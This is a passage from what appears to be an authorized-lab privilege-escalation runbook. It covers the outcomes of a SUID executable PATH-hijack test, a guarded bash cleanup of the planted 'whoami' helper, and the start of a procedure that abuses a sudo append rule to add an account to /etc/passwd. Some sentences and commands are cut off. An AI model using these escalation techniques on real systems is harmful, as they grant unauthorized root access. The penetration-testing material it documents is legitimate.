| Observed result | Next choice |
| --- | --- |
| Native numeric real/effective UID changes to the executable's owner on the assigned host | **LNX-01** for changed rights; exact objective proof and private evidence for an exact objective. An unchanged group is recorded separately, not assumed root group membership. |
| UID is unchanged, shell denied, lookup ignored or program errors | Record the exact failed boundary; **LNX-09** or **PAUSE-COVERAGE** for another observed lead. Spoofed account text is not success. |
| Remapped UID or namespace/host uncertainty | **LNX-02** or **EXP-03** before treating it as access to the assigned host. |
| Program behavior differs from reviewed source | Stop this method, keep the mismatch and return to **LNX-09**. Do not replace additional commands or modify the installed binary. |

After proof, `exit` only the opened child shell. In the original parent, repeat
`/usr/bin/id`, `printf 'Parent PATH: %s\n' "$PATH"` and `command -v whoami`;
they must match the recorded parent context. No global PATH restore is needed
because it was never exported. If still in a child, return before cleanup.

Remove only the unchanged helper. A mismatch or missing file is a recovery
question, not permission to delete an unrelated replacement:

```bash
if test -f '<same-private-lookup-directory>/whoami' &&
   test ! -L '<same-private-lookup-directory>/whoami' &&
   test "$(stat -c '%d:%i %a %u:%g' -- '<same-private-lookup-directory>/whoami')" = '<recorded-helper-device-inode-mode-owner>' &&
   printf '%s  %s\n' '<recorded-helper-sha256>' '<same-private-lookup-directory>/whoami' | sha256sum -c -; then
    rm -i -- '<same-private-lookup-directory>/whoami'
    if test ! -e '<same-private-lookup-directory>/whoami' && test ! -L '<same-private-lookup-directory>/whoami'; then
        rmdir -- '<same-private-lookup-directory>'
        test ! -e '<same-private-lookup-directory>' && printf 'Lookup directory absent\n'
    fi
else
    printf 'Helper changed or missing; cleanup not confirmed\n'
fi
```

Unexpected files keep `rmdir` from succeeding. Do not recursively remove them.
Continue the source step's cleanup for remaining resources. The installed SUID executable,
accounts and system lookup directories were not modified. Preserve normal
shell history; record any startup effects rather than blanket-erasing history.

## LPRIV-14. Can one exact delegated append support a reversible lab account transition?

Enter from LNX-03/09 with a verified target shell and the full sudo rule. The
reviewed installed program must support **one** of the two forms below under

and appends to its second. The second reads stdin and uses the observed `-a`
option to append to its sole file argument. Verify the installed parser/help
and write behavior. Neighboring source or an executable name is only a lead.
Overwrite tools, fixed destinations and other flags need a different procedure.
Do not run both forms or omit the required append option.

This deliberately changes `/etc/passwd`. Select it only on an isolated,
disposable authorized lab with explicit account-file permission and a tested
out-of-band root console or available pre-change VM/reset recovery. Keep the
original session open. No other account changes may run concurrently. Without
that recovery, return to LNX-09 for another observed right. This is never a
default box step, and a backup does not itself grant restoration rights.

`getent`, GNU Bash at `/bin/bash`, and the reviewed local helper
`scripts/lab-account-append.py`. Transfer/hash-review the helper through XFER-01
first, returning here. Use the observed absolute trusted target Python path
with `-I` for every helper call; record its executable and helper hashes.
Isolated mode excludes the staging directory and Python environment from imports.
Choose a new simple account name such as
`owb_<short-unique-id>` and a new absolute recovery directory below a trusted

```bash
stat -- '<absolute-observed-allowed-append-program>' /etc/passwd
sha256sum -- '<same-absolute-observed-allowed-append-program>' /etc/passwd '<absolute-observed-trusted-target-python3>' '<absolute-reviewed-local-lab-account-append.py>'

test -x /bin/bash

printf 'Name lookup exit: %s\n' "$?"
```

Name lookup must return `2`, meaning no matching entry. `0` means choose another

Prepare one record and recovery copies. Paste the generated `$6$...` hash at
